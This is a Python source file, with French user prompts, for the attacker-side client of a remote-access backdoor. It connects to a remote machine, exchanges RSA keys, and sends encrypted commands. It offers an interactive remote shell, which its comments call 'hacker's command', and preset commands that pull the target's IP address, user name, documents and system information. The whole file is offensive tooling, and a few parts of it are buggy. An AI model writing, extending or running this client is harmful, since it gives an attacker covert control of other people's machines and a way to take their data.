# coding: utf-8
import socket, sys, subprocess, time, argparse, base64
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.serialization import load_pem_public_key

remote_public_key = None
public_key_pem = None
private_key = None

class Configuration():

    def __init__(self, ip, port, server_port, query):
        # Configuration
        # Args : IP_source, port_source, port_dest  
        self.ip = ip
        self.port = port
        self.server_port = server_port
        self.query = query
        self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.s.connect((self.ip, self.port))

        global private_key
        global public_key_pem
        private_key = self.generate_private_key()
        public_key_pem = self.extract_public_key(private_key.public_key())

        self.communication = Communication(self.s, self.query)
        self.s.close()

    def generate_private_key(self):
        return rsa.generate_private_key(backend=default_backend(),
                                        public_exponent=65537,
                                        key_size=2048)

    def extract_public_key(self,public_key):
        return public_key.public_bytes(encoding=serialization.Encoding.PEM,
                                        format=serialization.PublicFormat.SubjectPublicKeyInfo)


class Communication():

    def __init__(self, s, query):
        #Handle input messages
        self.s = s
        self.query = query
        self.send_public_keys()
        self.options_chosen()

    def options_chosen(self):
        #Option to choose the shell or get_info
        self.query = str(self.query)
        self.query_send = self.query.encode("utf-8")
        self.query_send = self.encrypt(self.query_send)
        self.query_send = base64.b64encode(self.query_send) 
        self.s.send(self.query_send)    
        server_call = True

        while server_call:

            if self.query == "1" or self.query == "2":

                if self.query == "1":
                    self.remote_shell()

                else:
                    self.get_info()

                print("1 pour remote et 2 pour get_info")
                self.query = input("Entrez votre choix : ")
                #if self.query == "exit":

                self.query_send = self.query.encode("utf-8")
                self.query_send = self.encrypt(self.query_send)
                self.query_send = base64.b64encode(self.query_send) 
                self.s.send(self.query_send)
                #self.query = int(self.query)
            else:
                server_call = False
                print("Invalid number received or 'exit' entered!")

    def remote_shell(self):
        #Used the command line with hacker's command
        client_running = True
        while client_running:
            print("Enter 'exit' to leave")
            msg_call = input("Shell > ")
            msg_a_envoyer = msg_call.encode("utf-8")
            msg_a_envoyer = self.encrypt(msg_a_envoyer)
            msg_a_envoyer = base64.b64encode(msg_a_envoyer) 
            self.s.send(msg_a_envoyer)

            if msg_call != "exit":
                nb_result_str = self.s.recv(1024)
                nb_result_str = base64.b64decode(nb_result_str)
                nb_result_str = self.decrypt(nb_result_str)
                nb_result_str = nb_result_str.decode("utf-8")
                nb_result = int(nb_result_str)

                for i in range(nb_result):
                    line = self.s.recv(1024)
                    line = base64.b64decode(line)
                    line = self.decrypt(line)
                    line = line.decode("utf-8", "ignore").strip()
                    print(line)
            else:
                client_running = False

    def get_info(self):
        #Used the command line with auto-selected command
        client_running = True
        while client_running:

            print("\n\nWindows : ip_w/user_w")
            print("Linux : ip_l/user_l/documents_l/infosystem_l")
            command = input("get_info > ")
            command_send = command.encode("utf-8")
            command_send = self.encrypt(command_send)
            command_send = base64.b64encode(command_send)   
            self.s.send(command_send)

            if command != "exit":

                nb_result_str = self.s.recv(1024)
                nb_result_str = base64.b64decode(nb_result_str)
                nb_result_str = self.decrypt(nb_result_str)
                nb_result_str = nb_result_str.decode("utf-8")
                nb_result = int(nb_result_str)

                for i in range(nb_result):
                    line = self.s.recv(1024)
                    line = base64.b64decode(line)
                    line = self.decrypt(line)
                    line = line.decode("utf-8", "ignore").strip()
                    print(line)
            else:
                client_running = False


    def encrypt(self, message):
            #global remote_public_key
            return remote_public_key.encrypt(message, 
                                            padding.OAEP(
                                            mgf=padding.MGF1(algorithm=hashes.SHA256()),
                                            algorithm=hashes.SHA256(),
                                            label=None))

    def decrypt(self, ciphertext):
        global private_key
        return private_key.decrypt(ciphertext,
                                    padding.OAEP(
                                    mgf=padding.MGF1(algorithm=hashes.SHA256()),
                                    algorithm=hashes.SHA256(),
                                    label=None))

    def send_public_keys(self):
        try:
            global remote_public_key
            remote_public_key_pem = self.s.recv(1024)
            remote_public_key = load_pem_public_key(remote_public_key_pem, backend=default_backend())
            print("Remote public key successfully loaded")
            self.s.sendall(public_key_pem)
        except timeout:
            self.send_public_keys()

parser = argparse.ArgumentParser()
parser.add_argument("IP_source", help="your ip address")
parser.add_argument("Port_source", help="a port > 1024", type=int)
parser.add_argument("IP_server", help="ip address of server")
parser.add_argument("query", help="1 - Shell / 2 - Get_info", type=int)
args = parser.parse_args()

run = Configuration(args.IP_source, args.Port_source, args.IP_server, args.query)

